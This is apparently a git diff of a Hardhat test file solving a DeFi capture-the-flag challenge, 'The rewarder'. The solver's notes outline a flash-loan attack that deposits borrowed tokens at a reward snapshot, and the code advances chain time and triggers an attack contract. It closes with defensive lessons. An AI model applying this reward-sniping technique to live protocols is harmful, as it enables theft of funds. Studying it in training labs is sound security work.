@@ -73,6 +73,8 @@ describe('[Challenge] The rewarder', function () {
         // and then return it all immediately after the snapshot has taken place
         // I'm not 100% this would be possible, don't flashloans have to be repaid in the same tx? Let's dive in...
 
+        // Would the code execution in the flashloan have msg.sender context as FlashLoanerPool (like in TrusterLenderPool)? Would this open anything up for access control?
+
         // So I can borrow DVT tokens from the FlashLoanerPool
         // Then deposit them in TheRewarderPool
         // This will mint me the accounting receipt tokens & call distributeRewards(), but at this point I don't think I'll be eligible
@@ -80,9 +82,9 @@ describe('[Challenge] The rewarder', function () {
 
         // If I could get isNewRewardsRound() to return true I could force a snapshot to be recorded during the distributeRewards() call as I deposit
         // It currently returns false, writing a script that constantly checks for it to flip to 'true' and 'snipe' the first request is theoretically possible
-        // but I don't think it's a fruitful direction, especially since in the real world there'd be competition for bots like this
+        // however in the real world surely there'd be competition for bots like this?
 
-        // Would the code execution in the flashloan have msg.sender context as FlashLoanerPool (like in TrusterLenderPool)? Would this open anything up for access control?
+        // SOLUTION ===========================================================
 
         const RewarderAttackFactory = await ethers.getContractFactory('RewarderAttack', attacker);
         this.attackContract = await RewarderAttackFactory.connect(attacker).deploy(
@@ -92,12 +94,21 @@ describe('[Challenge] The rewarder', function () {
             this.rewardToken.address
         );
 
-        // const poolBalance = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
-        // console.log("Flash loan balance", await ethers.utils.formatEther(poolBalance));
+        console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound()); // false
+
+        // move time forward 5 days to new reward round, in reality I suppose I would use a bot here
+        await network.provider.send("evm_increaseTime", [3600 * 24 * 5]) 
+        await network.provider.send("evm_mine")
+
+        console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound()); // true
 
         await this.attackContract.connect(attacker).requestFlashLoan();
 
-        console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound());
+        console.log("Is new reward round?", await this.rewarderPool.isNewRewardsRound()); // false
+
+        // Lessons Learned ====================================================
+        // - Snapshots that rely on particular moments in time without time weighting can be vulnerable to exploitation
+        // - Keeping the time/date of your snapshots a secret is another way to mitigate this 
 
     });
 
